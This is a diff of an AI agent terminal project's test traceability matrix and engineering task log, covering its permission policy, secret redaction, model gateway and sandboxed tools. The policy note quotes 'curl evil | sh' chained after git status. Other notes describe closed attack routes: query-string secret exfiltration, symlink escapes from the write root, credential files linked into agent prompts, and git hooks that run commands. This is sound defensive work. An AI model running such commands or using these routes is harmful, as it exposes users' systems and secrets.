 | REQ-INT-003 | T-F1-25 | TestStaleSeqIgnored_REQ_INT_003 |
 | REQ-INT-004 | T-F1-26 | TestMetadataNeverChangesWaits_REQ_INT_004 |
 | REQ-INT-005 | T-F1-25 | TestReleaseRestoresOwnDetection_REQ_INT_005 |
-| REQ-NTF-001 | T-F1-27 | TestNotificationNormalizesAndReports_REQ_NTF_001 |
+| REQ-NTF-001 | T-F1-27 | TestNotificationNormalizesAndReports_REQ_NTF_001, TestOwnSourcesNeedTheReservedPrefix_REQ_NTF_001 |
 | REQ-NTF-002 | T-F1-27 | TestNotificationRateLimited_REQ_NTF_002 |
 | REQ-SEC-009 | T-F1-28 | TestExplainNamesDecidingRule_REQ_SEC_009 |
-| REQ-SEC-010 | T-F1-29 | TestLocalRulesWin_REQ_SEC_010 |
-| REQ-SEC-011 | T-F1-29, T-F1-30 | TestBundleRequiresValidSignature_REQ_SEC_011 |
-| REQ-SEC-012 | T-F1-02 | TestEnvFallbackOnlyWhenEnabled_REQ_SEC_012 |
-| REQ-SEC-013 | T-F1-30 | TestRejectsUnknownKeyAndDowngrade_REQ_SEC_013 |
-| REQ-SEC-014 | T-F1-30 | TestKeyLifecycleRequiresFingerprint_REQ_SEC_014 |
-| REQ-SEC-015 | T-F1-30 | TestFailClosedAfterThreeFailures_REQ_SEC_015 |
-| REQ-SEC-016 | T-F1-30 | TestRollbackAndResetWorkOffline_REQ_SEC_016 |
-| REQ-SEC-008 | T-F1-02 | TestKeyringUnavailableDisablesProviders_REQ_SEC_008 |
+| REQ-SEC-010 | T-F1-29 | TestLocalRulesWin_REQ_SEC_010, TestTheTurnDecidesWithTheActiveRules_REQ_SEC_010, TestTheDaemonLoadsLocalRules_REQ_SEC_010 |
+| REQ-SEC-011 | T-F1-29, T-F1-30 | TestRuleUpdateOptInAndLogged_REQ_SEC_011, TestARedirectIsRecordedBeforeItIsFollowed_REQ_SEC_011, TestAURLCarryingASecretIsRefused_REQ_SEC_011, TestBundleRequiresValidSignature_REQ_SEC_011, TestAnySignatureOfAValidKeyVerifies_REQ_SEC_011, TestRulesignVerifiesLikeTheDaemon_REQ_SEC_011, TestAStoredBundleIsCheckedAtStart_REQ_SEC_011, TestTheRuleStoreKeepsWhatTheManagerWrites_REQ_SEC_011 |
+| REQ-SEC-012 | T-F1-02 | TestEnvFallbackOnlyWhenEnabled_REQ_SEC_012, TestAnEnvProviderAsksTheKeyringFirst_REQ_SEC_012 |
+| REQ-SEC-013 | T-F1-30 | TestRejectsUnknownKeyAndDowngrade_REQ_SEC_013, TestAnUnchangedBundleIsUpToDate_REQ_SEC_013, TestARejectedBundleNotifiesTheUser_REQ_SEC_013 |
+| REQ-SEC-014 | T-F1-30 | TestKeyLifecycleRequiresFingerprint_REQ_SEC_014, TestTrustSeedMatchesByFingerprint_REQ_SEC_014, TestRemoveRevokesAndDiscardsBundles_REQ_SEC_014, TestFingerprintAndPublicKeyFormat_REQ_SEC_014, TestTheEmbeddedSeedParses_REQ_SEC_014, TestParseRefusesAMalformedSeed_REQ_SEC_014, TestRulesOverTheWire_REQ_SEC_014, TestUmbRulesKeyAddNeedsTheFingerprint_REQ_SEC_014, TestASeedRevocationLowersTheFloor_REQ_SEC_014 |
+| REQ-SEC-015 | T-F1-30 | TestFailClosedAfterThreeFailures_REQ_SEC_015, TestSeedDoesNotReopenFailClosed_REQ_SEC_015, TestAddOfSeededKeyReopensFailClosed_REQ_SEC_015, TestAFailedClosedStoreFetchesNothing_REQ_SEC_015 |
+| REQ-SEC-016 | T-F1-30 | TestRollbackAndResetWorkOffline_REQ_SEC_016, TestBuiltinDigestIsStable_REQ_SEC_016, TestUmbRulesStatus_REQ_SEC_016, TestRuleRecoveryEndToEnd_REQ_SEC_016, TestAResetKeepsTheVersionFloor_REQ_SEC_016 |
+| REQ-SEC-008 | T-F1-02 | TestKeyringUnavailableDisablesProviders_REQ_SEC_008, TestAnUnreachableKeyringIsUnavailable_REQ_SEC_008, TestStatusCarriesEachProvidersReason_REQ_SEC_008, TestStatusShowsWhyAProviderIsDown_REQ_SEC_008, TestADaemonWithoutAKeyringStartsDegraded_REQ_SEC_008; T-F1-05: TestModelsOfADownProviderAreDown_REQ_SEC_008 |
 | REQ-AGT-015 | T-F1-13 | TestSendIdempotentByClientMsgID_REQ_AGT_015 |
-| REQ-AGT-018 | T-F1-09 | TestFetchUrlRefusesPrivateRanges_REQ_AGT_018 |
+| REQ-AGT-018 | T-F1-09 | TestFetchUrlRefusesPrivateRanges_REQ_AGT_018, TestForbiddenAddress_REQ_AGT_018, TestFetchLimits_REQ_AGT_018 |
 | REQ-INT-006 | T-F1-25 | TestOwnAgentCannotBeDisplaced_REQ_INT_006 |
-| REQ-AUT-005 | T-F1-31 | TestLimitsDegradeWithoutDisconnect_REQ_AUT_005 |
-| REQ-AUT-006 | T-F1-31 | TestWaitListReportsAgeAndStalled_REQ_AUT_006 |
-| REQ-AUT-007 | T-F1-31 | TestCancelLeavesTurnRunning_REQ_AUT_007 |
-| REQ-AUT-008 | T-F1-31 | TestStalledTurnNotifiedNotKilled_REQ_AUT_008 |
-| REQ-OBS-004 | T-F1-18 | TestOrchestrationMetricsExposed_REQ_OBS_004 |
+| REQ-AUT-005 | T-F1-31 | TestLimitsDegradeWithoutDisconnect_REQ_AUT_005, TestLeakedWaitsKeepTheConnection_REQ_AUT_005, TestReportRateDegradesWithoutError_REQ_AUT_005 |
+| REQ-AUT-006 | T-F1-31 | TestWaitListReportsAgeAndStalled_REQ_AUT_006, TestUmbWaitListsOpenWaits_REQ_AUT_006 |
+| REQ-AUT-007 | T-F1-31 | TestCancelLeavesTurnRunning_REQ_AUT_007, TestWaitAdminOverTheWire_REQ_AUT_007, TestUmbWaitCancelEndsOneWait_REQ_AUT_007 |
+| REQ-AUT-008 | T-F1-31 | TestStalledTurnNotifiedNotKilled_REQ_AUT_008, TestActivityKeepsATurnFromStalling_REQ_AUT_008, TestALocalModelGetsTheLongerWindow_REQ_AUT_008, TestAnApprovalIsNotAStall_REQ_AUT_008, TestALaterSilenceIsANewStall_REQ_AUT_008, TestThreadPaneOutputIsActivity_REQ_AUT_008, TestStallWindowsAreConfigurable_REQ_AUT_008 |
+| REQ-OBS-004 | T-F1-18 | TestOrchestrationMetricsExposed_REQ_OBS_004; also TestActiveCountsTheOpenWaits_REQ_OBS_004 (`internal/waits`) |
+| REQ-SEC-017 | T-F1-32 | TestASilentConnectionIsClosedAfterTheDeadline_REQ_SEC_017 |
+| REQ-SEC-018 | T-F1-32 | TestANotificationBeforeHelloIsUnauthorized_REQ_SEC_018 |
+| REQ-API-005 | T-F1-33 | TestAResponseOverTheLimitIsResultTooLarge_REQ_API_005, TestResultTooLargeCarriesItsSizes_REQ_API_005 |
+| REQ-OBS-005 | T-F1-33 | TestFramesAreCounted_REQ_OBS_005, TestStatusShowsTheFramesLine_REQ_OBS_005, TestLimitsShowsTheLimitAndTheCounters_REQ_OBS_005 |
+| REQ-CLI-007 | T-F1-33 | TestLimitsSetRaisesTheLimitForNewConnections_REQ_CLI_007, TestAnOversizedAnswerTellsTheUserHowToRaiseTheLimit_REQ_CLI_007, TestLimitsSetSendsTheSizeInBytes_REQ_CLI_007, TestTheClientReadsWithTheLimitTheHandshakeAnnounced_REQ_CLI_007 |
+| REQ-SKL-001 | T-F1-34, T-F1-35 | TestInstallCopiesRecordsAndRunsNothing_REQ_SKL_001, TestSkillsOverTheWire_REQ_SKL_001, TestInstallAsksOrNeedsYes_REQ_SKL_001, TestTheManifestCannotHideAFile_REQ_SKL_001, TestOnlyACharacterDeviceIsATerminal_REQ_SKL_001 |
+| REQ-SKL-002 | T-F1-34 | TestABadBundleIsRefusedWhole_REQ_SKL_002, TestACrashMidInstallLeavesNothingAfterRestart_REQ_SKL_002, TestTheDaemonSweepsSkillsAtStart_REQ_SKL_002, TestAnInterruptedReplaceKeepsTheRecordedCopy_REQ_SKL_002, TestAForeignSkillsDirectoryIsNeverSwept_REQ_SKL_002, TestMoreBadBundles_REQ_SKL_002, TestATruncatedStreamIsRefused_REQ_SKL_002 |
+| REQ-SKL-003 | T-F1-35 | TestSkillCommandsMirrorTheMethods_REQ_SKL_003 |
+| REQ-SKL-004 | T-F1-34, T-F1-36 | TestTheSixtyFifthSkillIsStoredDisabled_REQ_SKL_004, TestPromptCarriesDescriptionsNotBodies_REQ_SKL_004, TestTheDaemonListsSkillsAndLoadsThem_REQ_SKL_004, TestTheCatalogIsCappedAndOneLinePerSkill_REQ_SKL_004 |
+| REQ-SKL-005 | T-F1-36 | TestASkillCannotRunOrWidenAnything_REQ_SKL_005, TestSkillLoadIsReadOnlyAndTainted_REQ_SKL_005 |
+| REQ-SKL-006 | T-F1-34 | TestARemoteSourceIsRefused_REQ_SKL_006 |
+| REQ-SKL-007 | T-F1-36 | TestASkillChangeReachesTheNextTurn_REQ_SKL_007 |
+| REQ-CLI-008 | T-F1-37 | TestMcpCommandsMirrorTheMethods_REQ_CLI_008, TestCliMayManageMcpServers_REQ_CLI_008, TestEnvIsTakenOutBeforeTheFlags_REQ_CLI_008 |
+| REQ-CLI-009 | T-F1-38 | TestThreadCommandsDriveAThread_REQ_CLI_009, TestThreadWaitTimeoutExitsOne_REQ_CLI_009, TestThreadGetPrintsEveryPage_REQ_CLI_009, TestThreadWaitAndGetServeTheCLI_REQ_CLI_009 |
+| REQ-TUI-004 | T-F1-37 | TestAgentPanelShowsServersAndSkills_REQ_TUI_004, TestTheExtensionsViewStaysInItsRows_REQ_TUI_004, TestToEventMapsTheExtensionsNotifications_REQ_TUI_004 |
 
 **SHOULD/COULD covered or deferred:**
 
 | REQ | Status |
 |---|---|
-| REQ-AGT-012 | SHOULD, covered by T-F1-09 |
-| REQ-LLM-007 | SHOULD, covered by T-F1-08 |
-| REQ-OBS-003 | SHOULD, covered by T-F1-18 |
+| REQ-AGT-012 | SHOULD, covered by T-F1-09: TestEditFileProducesDiff_REQ_AGT_012, TestEditFileNeedsAUniqueMatch_REQ_AGT_012, TestAWriteThroughALinkWritesItsTarget_REQ_AGT_012 |
+| REQ-LLM-007 | SHOULD, covered by T-F1-08: TestPresetsLoad_REQ_LLM_007, TestPresetsGetTheOpenAICompatAdapter_REQ_LLM_007 |
+| REQ-OBS-003 | SHOULD, covered by T-F1-18: TestTracesExportThroughOTLP_REQ_OBS_003 |
 | REQ-LLM-008 | COULD, deferred to F2 |
 | REQ-BLK-008 | SHOULD, deferred to F2 |
 
@@ -397,4 +583,47 @@ default CI.
 
 | Date | Tasks | Result | Notes |
 |---|---|---|---|
+| 2026-09-26 | T-F1-32 to T-F1-37 | added, not started | Four deltas ratified together and folded here. The fold drops the tasks' own "ratification bookkeeping" bullets and PRD entries, because ratification did that work: the REQs are in PRD 1.13, the `skills` table in Data Model 1.9, and the order in Plan 1.10. The API and Tech Design text stays with each task's Spec edits. API and Tech are bumped one step per task, in task order, and the versions each archived delta proposed are only a guide. |
+| 2026-09-27 | T-F1-32 | done | The deadline is an absolute read deadline set at accept and cleared by a successful `system.hello`, so it lives on the read goroutine with the handshake state and cannot race a hello. An id-less or null-id hello is refused in `handleLine`, before the method table and the token. API 1.15 writes §1's JSON-RPC deviation, §2 steps 3/3a/5/6, §7's `UNAUTHORIZED` row and §8's deadline row. Each test was seen red against its own break (deadline removed, id check removed, pre-hello notification left silent, deadline not cleared). The `spec-guardian` review found the last one untested; the case `an authenticated connection outlives the deadline` closes it. It also found that §8's cap of 32 concurrent connections is **not enforced** by `Serve`: pre-existing, outside this task, still open. `task ci` green. |
+| 2026-09-27 | T-F1-33 | done | Every outbound frame is serialised once in `conn.frame` and measured there: a response over the connection's limit becomes `RESULT_TOO_LARGE` (-32014) under its id, a notification becomes `limits.notification_dropped` under its `seq`, and `block.get` shortens its one output field first (raw on a 3-byte boundary, plain by bisection over the encoded JSON). The inbound limit moved from the scanner's buffer size into a split function reading the connection's own limit, so it can rise at `system.hello` without resizing a buffer mid-scan; before the handshake it stays 4 MiB. `limits.set` writes through `config.WriteMaxMessageBytes`, which implements the delta's file-cases table. Writing the real-daemon test found a **parser defect**: a quoted value followed by a comment (`max_message_bytes = "4MiB"  # why`) was read with the comment as part of the value, and the daemon refused to start; fixed in `parseTOMLSubset`, with cases in `TestMaxMessageBytesIsReadAndBounded`. Mutations: outbound refusal off, `block.get` fit off, each counter off, a payload in the warn line, hello keeping 4 MiB, the daemon not reading the setting, `limits.set` without a settings path and the `umb` hint off — each reddens its test. One survives and is equivalent: without `runeStart` the plain cut still lands on a rune boundary, because `encoding/json` makes every stray byte a 6-byte `\ufffd`, so a mid-rune cut is never the longest that fits; `runeStart` stays because it keeps the bisection's predicate monotone. The `spec-guardian` review found four more things, all fixed test-first: the inbound refusal's warn line named no size (it now logs `size_bytes_at_least`, and §5.2 says why it has no method); `api = { max_message_bytes = 128 }` was read as an unknown key and started the daemon at 4 MiB (inline tables and arrays are now refused as outside the subset); `ParseSize` called 100MiB "not a size" instead of out of range; and a CRLF file lost its `\r` on the rewritten line. The delta's Verification names `umb block get`, which does not exist; the hint test runs `umb block last`, `umb status` and `umb workspace list`. `umb limits set` itself runs only against a fake daemon; the real-daemon test drives `limits.set` through `internal/client`. API 1.16, Tech 1.14. `task ci` green. |
+| 2026-09-27 | T-F1-01 | done | `0005_agent.sql` is the Data Model's DDL extracted from its `sql` blocks rather than retyped: 13 tables, 10 indexes and the two `ALTER TABLE threads` of §2.5, 25 statements that the `spec-guardian` review compared one by one with §2.4c–§2.13, identical and in the same order. `TestMigration0005Constraints` drives every `CHECK`, foreign key, unique and partial index, the safe defaults (`mcp_servers.trust` untrusted, `messages.tainted` 0) and the cascades (a thread takes its messages, its `usage` rows stay with `thread_id` NULL); `TestMigration0005AddsTheAttentionColumnsToExistingThreads` upgrades a database holding a thread at 0004. Recovery gains §6 steps 3 and 4 and — **beyond the task's letter** — step 8, because the tables now exist and no task owned clearing them. Only the state changes: an expiry sets no `decided_at` and a stop leaves `updated_at` alone, so a crash does not reorder `thread.list`. The review also found T-F1-24's text telling it to write the attention columns into 0005, which would edit an applied migration; T-F1-24 now writes to the columns T-F1-01 created. Open: `sdd_check.py` runs the spec's DDL but does not compare it with the migration files, so only this task's test and review prove 0005 matches. `task ci` green. |
+| 2026-09-27 | T-F1-02 | done | The specs never gave the provider configuration a shape: Tech §5.1 named only `config.toml`. The reference architecture did (`docs/ARCHITECTURE.md` §7: `models.toml`, `[[providers]]`, `api_key = "keyring:…"`, go-toml/v2 + JSON Schema + go-keyring), and T-F1-08 already names `examples/models.toml`, so this task followed it and wrote it into Tech 1.15 §5.1 rather than inventing one; spec-guardian ruled that this needs a delta (Art. 9), so it is written up as **`changes/_archive/2026-09-provider-config/`, pending the Tech Lead's ratification**; the code follows it. `models.toml` is real TOML validated by an embedded schema; `config.toml` keeps its subset parser and gains `[secrets] allow_env`. Credential resolution is a pure function in `security/domain` over two injected lookups; the keyring is a port with a go-keyring adapter that times out a wedged D-Bus, and is probed only when a provider names it, since a locked desktop keyring can prompt. At start a plaintext key refuses its entry (reported `down`/`plaintext_secret`); on `config.reload` it refuses the reload and nothing is applied. `TestADaemonWithoutAKeyringStartsDegraded_REQ_SEC_008` runs all three REQs against a real daemon whose D-Bus points at nothing, and checks neither secret reaches its log. API 1.17 (§5.28, §5.2 `reason`, `config` capability), Tech 1.15. Models' own `health = down` (REQ-SEC-008's second clause) waits for T-F1-05, which creates the model rows; until then the provider carries it, and T-F1-05 now owns it with a named test. The review also hardened three things: a malformed `keyring:`/`env:` reference no longer echoes its value, an option named like a credential (`[providers.options] token = …`) refuses its entry like a plaintext `api_key`, and a reload of a file that does not parse names the file in `details`. `task ci` green. |
+| 2026-09-27 | T-F1-03 | done | `Decide(Action, Mode, Rules, tainted)` is pure and returns the verdict, the reason (`approvals.reason`'s values for `ask`, `deny_rule`/`not_exposed` for `deny`), the deciding step, whether `always` may be offered, and a complete trace ready for `policy.explain` (T-F1-28). spec-guardian found the approved specs contradicting each other (DD-006 vs the §5.3 table, DD-006 vs REQ-AGT-013, API §5.36's trace) and silent on compound command lines, so the choices are written up as **delta `2026-09-policy-precedence`, proposed and pending ratification**: an exposure step 0 (`ask` and unknown modes deny what they do not expose); a destructive pattern as a floor that a `deny` rule still overrides; `auto-edit` asking for any write outside the write root whatever the `allow` rules; a `deny` rule matching any command of a line while `allow` rules must cover every one (`git status*` no longer carries `git status; curl evil \| sh`); every step traced. Destructive patterns are regexes over each normalised simple command — `sudo`, `env`, `timeout`, `eval`, `busybox`, `sh -c`, `find -exec`, chaining, `$(…)` and `/bin/rm` do not hide one; 53 destructive and 24 harmless lines in the tests. Write root: the nearest repo root at or above the cwd, I/O injected; the inside test is lexical. Coverage 98.6 %; 34 mutations over two rounds, all killed — one survivor exposed a line with no command being allowed by no rule at all, now closed. `task ci` green. |
+| 2026-09-27 | T-F1-04 | done | `Redact(text)` returns the text with every match as `[REDACTED:<rule>]` and a count per rule for the egress audit; `Redactor{Rules, Entropy}` takes a bundle's rules (T-F1-29). Fourteen named rules (the task's list plus OpenRouter, Slack and the GCP key id) and the entropy detector. The corpus, `testdata/redact/corpus.json`, has 43 positives and 42 negatives; its secrets are `{{rand:N:CLASS}}` templates expanded by a seeded PRNG, and `{{PRIVATE}}` keeps PEM headers out of the file, so gitleaks and push protection see no key. **Two findings for the Tech Lead,** written into Tech 1.17 DD-008 and **delta `2026-09-redaction-thresholds`, proposed and pending ratification**: REQ-SEC-001's thresholds are read as necessary, not sufficient — Umbral ids (`thr_…`, up to 4.7 bits) and identifier-shaped tokens (long Go test names reach 4.56) are left alone, at a measured cost of ~0.05 % of random keys; and the 4.5-bit floor itself catches ~98 % of random 40-character keys but ~70 % at 32 and ~5 % at 24, since a string's own entropy cannot reach 4.5 bits under 23 characters. Mutation testing found a real bug: the `.env` rule required a letter before the keyword, so `PASSWORD=`, `TOKEN=` and `SECRET_KEY_BASE=` were never redacted; spec-guardian found a real leak: a match holding a placeholder was skipped whole, so `DB_PASSWORD=hunter2hunter2:AKIA…` kept the password — now only a match that is nothing but placeholders is skipped — and a `.env` rule that redacted `MAX_TOKENS` and `BYPASS_CACHE`, now matched by name segment. 24 mutations, all killed. `task ci` green. |
+| 2026-09-27 | T-F1-05 | done | The gateway's first half. `llmgw/domain` holds the provider-neutral model, request and normalized event (`text_delta`, `reasoning_delta`, `tool_call`, `usage`, `done`) and a `ProviderError` whose `Retryable` is REQ-LLM-003's 429/5xx/transport rule for T-F1-07; `llmgw/ports` the `Provider` and `ModelStore` ports. Adapters on Fantasy v0.45.2: `openaicompat` serves `openai-compat`, `lmstudio` and `llamacpp`; `openrouter` uses Fantasy's OpenRouter provider, whose URL is built in, through an HTTP client that rewrites it to `base_url`; `fantasyconv` is what they share. Discovery reads `<base_url>/models`, OpenRouter's prices becoming micro-USD per Mtok. The catalog (`internal/llmgw`, a new `llmgw-service` component in `.go-arch-lint.yml`, same shape as `workspaces`) never contacts a provider down for its credential and lists its models `down` with the provider's reason — **REQ-SEC-008's second clause, closed here** (delta `2026-09-provider-config`, decision 8, no new column); a provider that does not answer keeps its models, `down`/`discovery_failed`. `model.list` (API 1.18: Model gains `reason`) and background discovery at start and on reload; `TestADaemonDiscoversModelsAtStart_REQ_LLM_002` runs it on a real daemon against a fake server. `llamacpp` added to the provider types (REQ-LLM-001 names it; Tech 1.18). Found on the way: T-F1-02's end-to-end test pointed its `openrouter` provider at the real service, which the daemon now contacts at start — moved to a refused loopback port. spec-guardian blocked the first version on Art. 4: discovery sent requests off the machine with no `egress_log` row. The hook REQ-SEC-002 gave T-F1-07 therefore lands here, as an HTTP transport under every adapter that writes the row before sending and fails closed (`egresslog` adapter; thread NULL for the daemon's own requests); `router.offline = true` now means no remote provider is contacted, discovery included (`offline` reason, delta decision 8b); keys stay in a redacting `APIKey` up to the header, and both providers format without their insides, where Fantasy keeps the key; the OpenRouter rewrite refuses any URL outside its own instead of passing it through with the key; removed providers' rows are deleted; `golang.org/x/crypto`, new with Fantasy, bumped to v0.56.0 (one uncalled advisory has no fix). 44 mutations over three rounds, all killed. `task ci` green. |
+| 2026-09-27 | T-F1-06 | done | Native Ollama adapter over `/api/chat` NDJSON, written by hand: Fantasy has no Ollama provider, and Ollama's OpenAI endpoint cannot carry `num_ctx` (DD-005). Every request carries `num_ctx` — the configured one, else 32768 capped at the model's window from `/api/tags` (delta `2026-09-provider-config`, 8d) — with `keep_alive` at the top level, `think` and `format` only when asked (the domain request gains `Reasoning` and `ResponseSchema`; tool results carry `ToolName`, which Ollama matches on). Discovery reads each model's capabilities and window; an embedding model is listed without tools, an older Ollama that reports no capabilities is assumed to take them. The wire format was taken from the local Ollama 0.33.3 rather than assumed: tool calls arrive whole with an `id` and arguments as an object, and the stream ends `done_reason: stop` even after one, reported here as `tool_calls`. An error inside the stream, a cut stream and a refused call are `ProviderError`s. `TestOllamaLive` passed against the local `gpt-oss:20b` in 20 s. The refused port T-F1-05 gave the e2e test's `ollama` provider is what keeps it off a real Ollama now that the daemon contacts it at start. A configured `num_ctx` that is not a positive integer is refused (`invalid_config`), and a test with a remote base URL proves discovery and chat go through the egress log and stop when it cannot be written (`TestOllamaRemoteRequestsAreLogged_REQ_SEC_002`; the mutant that bypassed the transport survived before it). 20 mutations, all killed. Open, and handed to T-F1-07: the openai-compat and OpenRouter adapters ignore `Reasoning` and `ResponseSchema`; before discovery has run in a process the window cap is unknown and 32768 is sent; `done_reason` values other than `stop` pass through raw. `task ci` green. |
+| 2026-09-27 | T-F1-07 | done | The router lives in `internal/llmgw` beside the catalog (`llmgw-service`), not a `router/` package: it needs only the module's ports. It walks a class's candidates through the catalog (skipping one undiscovered or `down`, offline included), then the capability filter (tools, response schema, reasoning, window at four characters a token), in declared order. The request is redacted once with the built-in rules and the call's context carries its thread. Fallback is decided before the first event reaches the caller — 429, 5xx, transport failure, an empty stream, or no event within 30 s remote / 120 s local; a 4xx or a request that could not be built ends the call, and so does any failure after the first event. Every call made is one `usage` row, failures included (`rate_limited`, `timeout`, `error`), with its first-token time and its cost rounded to the micro-USD; a row that cannot be written is logged, not fatal. spec-guardian blocked the first version twice over: the first-token clock started only once `Stream` returned, but the real adapters send the request inside it, so an Ollama holding its headers while it loads a model was neither timed out nor left — reproduced against the real adapter and now `TestAServerThatHoldsItsHeadersTimesOut_REQ_LLM_003`; and tool descriptions, tool input schemas and the response schema left unredacted, against REQ-SEC-001's "all content" — every string in them is redacted now, on copies. The choices beyond REQ-LLM-003/005's text (no fallback after the first event, transport failures and empty streams fall back, other 4xx end the call, an adapter's refusal is not a call, the window estimate, a failed `usage` write is fail-open, the clock starting before the request) are **delta `2026-09-router-fallback`, proposed and pending ratification**. `gateway.configure` now sets the classes before the providers. From the T-F1-06 review: the Fantasy-based adapters now refuse reasoning and response schemas with `ErrUnsupported` rather than drop them, and the router skips them without recording a call; `ProviderError.Permanent` makes Ollama's unbuildable requests non-retryable. `TestEgressLoggedForRemote_REQ_SEC_002` drives the real Ollama adapter through the gateway's router at a remote host name served locally and checks the row's hash against the payload that left, which carries `[REDACTED:github_token]`. 44 mutations, all killed after the capability test was split so each model fails exactly one filter. No API method calls the router yet; T-F1-13's `thread.*` will, mapping `ErrNoCandidate` to `PROVIDER_UNAVAILABLE`. `task ci` green. |
+| 2026-09-27 | T-F1-08 | done | `examples/models.toml` is a commented template: router, classes, the local Ollama, LM Studio and llama.cpp (the last two commented out), the two REQ-LLM-007 presets, and OpenRouter; every key a `keyring:` reference. `config.Presets` holds the Hugging Face router and OmniRoute as data, and `TestPresetsLoad_REQ_LLM_007` loads the example as shipped — nothing refused, the presets in step with the code, every class candidate naming a defined provider — while `TestPresetsGetTheOpenAICompatAdapter_REQ_LLM_007` checks both are served by the openai-compat adapter and every example provider gets one. Checking the example against the code found two wrong instructions before they shipped: go-keyring stores the account as the Secret Service attribute `username`, not `account`, so the `secret-tool` line would have stored a key the daemon never finds; and `umb` has no `config reload` command (only the API method). **Open for the Tech Lead:** a loopback OmniRoute that forwards to the cloud is `local` to Umbral — offline mode does not stop it and its onward traffic is not in `egress_log`. spec-guardian ruled that writing that consequence down is a decision, so it is decision 8e of the pending delta `2026-09-provider-config`, with a per-provider `local = false` override as the open question; the example warns beside the preset, keeps OmniRoute out of every default class, and no longer says offline means nothing leaves the machine. 5 mutations, all killed. `task ci` green. |
+| 2026-09-27 | T-F1-09 | done | The tools module's registry and seven built-ins (`read_file`, `write_file`, `edit_file`, `grep`, `glob`, `list_dir`, `fetch_url`; `run_command` is T-F1-10), in `internal/tools/adapters/{registry,builtin}` since the arch rules map adapters there. Every tool registers a closed JSON Schema and a risk; input is validated (`invalid_args`) before a tool sees it, and **a call runs only under a grant** — the policy's `allow` or an approved `ask` — which makes AGENTS.md's "never outside `security.Decide()`" mechanical; the declared risk overrides whatever a tool's `Action` says. `write_file`/`edit_file` preview a unified diff (go-udiff) for `approval.requested`. Three gaps found by working against the specs rather than the task line: **Art. 4 covers `fetch_url`** — a URL the redaction rules would change is refused (a query string is the easy exfiltration channel) and every hop is recorded in `egress_log` before it is sent, failing closed; **REQ-AGT-018 only named redirects**, so the address check runs at dial time after DNS on every connection, with no proxy; and **Tech §5.3 left symlink resolution to this task**, which the first version skipped — a link inside the write root pointing out of it was allowed in `auto-edit`, now resolved through the nearest existing ancestor with the cwd and root. spec-guardian then blocked the commit on four more, three reproduced by running: a symlink swapped in while an approval waited still let the write escape the root (the write used the lexical path) — the grant now carries the action it was decided on and `Invoke` recomputes it, and writes run in an `os.Root` on the target's nearest directory; `read_file` on `/dev/zero` grew past 1 GiB of heap and a FIFO hung it — file tools now read only regular files of at most 16 MiB, opened non-blocking; a grant could be replayed on another call; and two files an early test version wrote into the package directory were staged (removed; an env that is not absolute is now refused). A write through an existing link now writes its target, as the diff shows. A second review found the write still resolved the path again after the check — reproduced, and closed by handing the tool the checked target (`Env.Target`) — and a malformed `%` escape that skipped the decoded-URL secret check, now a refusal. All written up as **delta `2026-09-builtin-tools`, proposed** (Tech 1.22 §5.3b, Data Model 1.10 §2.12). Tests run on loopback servers with an injected address policy; nothing reaches the network. Over 75 mutations in eight rounds: all killed but one equivalent; `os.Root` is defence against a swap during the write itself, which no deterministic test can stage, since `MkdirAll` already refuses a link component (`Replace` vs `ReplaceAll` when the match is unique). `task ci` green. |
+| 2026-09-27 | T-F1-10 | done | `run_command` runs in the thread's own PTY: `sessions.RunForThread` finds the live session the thread owns or creates it (shell integration, `owner_thread_id`, input held by the agent), waits for the shell to prove its integration, hands the recorder a claim so the next block opens as origin `agent` with the thread, types the one-line command as the agent and returns when that block closes, with its exit code and output. The tool (`builtin/runcommand.go`, over the new `sessions/ports.AgentTerminal`) bounds the time (120 s, 1–600) and returns the last 64 KiB. Cancel was the hard part, found by running against a real bash: SIGINT to the shell does not interrupt `sleep 60 & wait`, and the foreground group is the shell's own while `wait` runs, so the cancel kills the process group of every child of the shell (read from `/proc`, `pgrep -P` elsewhere) and then interrupts the shell, which also ends a loop of builtins; a foreground-group `ioctl` added first proved redundant under mutation and was removed. `TestCancelUnder500ms_REQ_AGT_007` covers a background job, a foreground command and a builtin loop, each under 500 ms with the shell surviving. Found on the way: `session.list`/`get` never read `owner_thread_id` back, though the API declares it — fixed with a test. spec-guardian then required a delta entry for two decisions and found two races: the cancel now follows Tech §3 step 3 (SIGTERM, SIGKILL 300 ms later) aimed at the shell's children rather than its own group; a result whose block row failed is still returned but marked not persisted (C-01 for this path); a thread's first two commands started together no longer create two PTYs; and a cancelled run whose block had not closed keeps the PTY until it does or the shell prompts, so its late block cannot be taken for the next command's (not staged by a test: the window needs a shell that reads the line after 450 ms). The matrix keeps `TestCancelUnder500ms_REQ_AGT_007` for T-F1-16's `thread.cancel`; T-F1-10's is `TestKillForegroundUnder500ms_REQ_AGT_007`. Decisions 6–10 of delta `2026-09-builtin-tools` (proposed). 27 mutations, all killed. `task ci` green. |
+| 2026-09-27 | — | deltas ratified | The Tech Lead ratified the five deltas T-F1-02…T-F1-10 raised (`provider-config`, `policy-precedence`, `redaction-thresholds`, `router-fallback`, `builtin-tools`) as written, and asked for the optional REQ sharpenings to be folded: REQ-SEC-001 (the 23-character floor, necessary-not-sufficient thresholds, the generic detector's recall), REQ-SEC-002 (`fetch_url`), REQ-AGT-018 (every connection, not only redirects), REQ-LLM-003 (before the first token reaches the caller) and REQ-LLM-005 (calls made to a provider). PRD 1.14, Tech 1.24, Data Model 1.11; the deltas are archived. T-F1-28 still writes API §5.36's example trace. |
+| 2026-09-27 | T-F1-11 | done | `internal/context`: the domain orders the rules-file candidates (closest directory first; AGENTS → CLAUDE → WARP → CRUSH, each `.local.md` above its file), builds attachments capped at 256 KiB on a UTF-8 boundary with the omitted bytes counted against the file's size, and renders the system prompt and the user message from embedded `text/template`s; `adapters/local` reads rules from the cwd up to the policy's write root, `file`/`dir`/`block` attachments (regular files only, opened without blocking — a FIFO would hang the turn) and git context. Found while writing the git test: `git status` runs a repository's `core.fsmonitor` command. spec-guardian then reproduced the same for filter drivers (`clean` runs on a racily-clean file, in `status` and in `diff --stat`) — in `auto-edit` the agent may write `.git/config` itself, so reading context would run an Exec no policy decided on — and found that a rules file linked out of the repository (a clone can carry `AGENTS.md -> ~/.aws/credentials`) was read into every prompt, and that a git timeout or ownership refusal was taken for "not a repository". Now: every configured filter driver is overridden empty and not required (a name no `-c` can carry stops git), rules files are read only if they resolve inside the root, and a failing git is a section saying why. Written up as **delta `2026-09-context-assembly`, proposed**, with the bounds (rules files 256 KiB, git sections 32 KiB). Tech 1.25 §5.3c. The `Blocks` port is wired with the runtime in T-F1-13. 45 mutations over five rounds: all killed but equivalents — `--no-ext-diff`/`--no-textconv`/`diff.external` do not change `diff --stat` (kept as 